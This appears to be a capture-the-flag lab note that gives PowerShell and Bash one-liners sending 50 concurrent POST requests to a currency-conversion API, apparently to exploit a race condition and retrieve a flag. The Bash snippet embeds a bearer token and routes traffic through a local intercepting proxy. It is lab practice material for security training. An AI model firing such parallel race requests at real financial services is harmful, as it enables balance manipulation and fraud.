# Command Line Testing

## Powershell

```powershell
- 1..50 | ForEach-Object -Parallel { try { $resp = (Invoke-WebRequest -Method POST `-Uri "<your lab>"` -Headers @{ "Content-Type" = "application/json"; "Authorization" = "Bearer <your token" } ` -Body '{"from_currency":"USD","to_currency":"EUR","amount":50}' ).Content | ConvertFrom-Json if ($resp.flag) { "FLAG FOUND: $($resp.flag)" } } catch {} } -ThrottleLimit 50
```

## Bash

```shell
seq 50 | xargs -I{} -P 50 curl -k -x http://127.0.0.1:8080 -X POST \
    -H 'Content-Type:application/json' \
    -H 'Authorization:Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NCwidXNlcm5hbWUiOiJ0ZXN0ZXIxIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3NzE1OTYzNTN9.-pvatNd0QsCWiABxW6b52FTiSlkUDS7G0Jf_vcYROrU' \
    -H 'X-PwnFox-Color:magenta' \
    -H 'Priority:u=0' \
    -d '{
  "from_currency": "USD",
  "to_currency": "EUR",
  "amount": 10
}' \
    'https://lab-1771596331957-t6ucr7.labs-app.bugforge.io/api/convert-currency'
```

